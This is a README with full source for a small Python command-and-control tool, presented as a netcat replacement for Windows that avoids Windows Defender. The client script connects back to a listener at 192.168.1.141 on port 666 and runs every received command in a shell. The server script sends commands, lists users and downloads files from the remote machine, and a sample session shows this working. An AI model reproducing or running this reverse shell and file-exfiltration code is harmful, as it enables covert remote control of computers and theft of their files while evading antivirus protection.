## Usage

A script created to replace netcat in a windows machine, so we don't trigger the Defender.  
In the windows machine, run the client `python3 cco_c.py` and in kali the server `cco_s.py`  
This command and control not only allows you to run windows commands like `whoami` but also, some custom ones
- download <file> : to download a file from the remote windows machine
- pwd : to show the current directory
- list users: to list all the users
- And I will be implementing new ones

```python
$: python3 cco_s.py
[+] Listening for incomming connections...
[+] Connection established by ('192.168.1.134', 49920)

>> dir
 El volumen de la unidad C no tiene etiqueta.
 El n√∫mero de serie del volumen es: F0E0-7D03
 Directorio de C:\Users\jessica\Desktop
12/21/2023  10:52 AM    <DIR>          .
12/21/2023  10:52 AM    <DIR>          ..
12/26/2023  11:08 AM                16 hola_mundo.txt

>> download hola_mundo.txt
Downloaded [hola_mundo.txt]: 16b
```


-------------------------------

## Server

File `cco_s.py`

```python
import socket, sys, time, signal
from termcolor import colored as col

def def_handler(sig, frame):
    print(col("[*] Saliendo...","yellow")); srv.close(); sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

def run_cmd(cmd, conn):
    conn.send(cmd.encode()); output = conn.recv(2048).decode()
    return output

def download_file(file_name, conn):
    if '/' in file_name or '\\' in file_name:
        dir_name = file_name.split('\\')[0]; file_rel = file_name.split('\\')[1].replace('"',''); 
        size = int(run_cmd(f'dir {dir_name}" | findstr {file_rel}', conn).split()[3].replace(",",""))
    else:
        size = int(run_cmd(f"dir . | findstr {file_name}", conn).split()[3].replace(",",""))
    conn.send(f"type {file_name}".encode()); conn.settimeout(5)
    if "\\" in file_name:
        file_name = file_name.split('\\')[1]
        file_name = file_name.replace('"', '') if '"' in file_name else file_name
    with open(file_name, "wb") as file:
        try:
            while (data := conn.recv(1024)):
                file.write(data)
        except Exception:
            pass
    time.sleep(3); print(col(f"Downloaded [{file_name}]: {size}b", "yellow"));

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", 666)); srv.listen(); print(col(f"\n[+] Listening for incomming connections...", "yellow"))
    conn, addr = srv.accept(); print(col(f"\n[+] Connection established by {addr}", "yellow"))
    while True:
        cmd = input(col(">> ", "yellow"));
        if cmd == "list users":
            cmd = "net user"; print(run_cmd(cmd, conn));
        elif cmd == "exit":
            srv.close(); sys.exit(0)
        elif cmd == "pwd":
            print(run_cmd("echo %cd%", conn))
        elif "download" in cmd:
            file_name = cmd.replace("download ", ""); download_file(file_name, conn);
        else:
            print(run_cmd(cmd, conn))   
```
------------------------------

## Client

File `cco_c.py`

```python
import socket, subprocess, sys

run_cmd = lambda cmd: subprocess.check_output(cmd, shell=True).decode('cp850')
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(('192.168.1.141', 666)); 
    while True:
        cmd = s.recv(1024).decode().strip(); 
        try:
            output = run_cmd(cmd); s.send(output.encode() + b"\n")
        except subprocess.CalledProcessError as e: 
            s.send(str(e).encode() + b"\n")
        except ConnectionAbortedError:
            sys.exit(0)
```

------------------------------

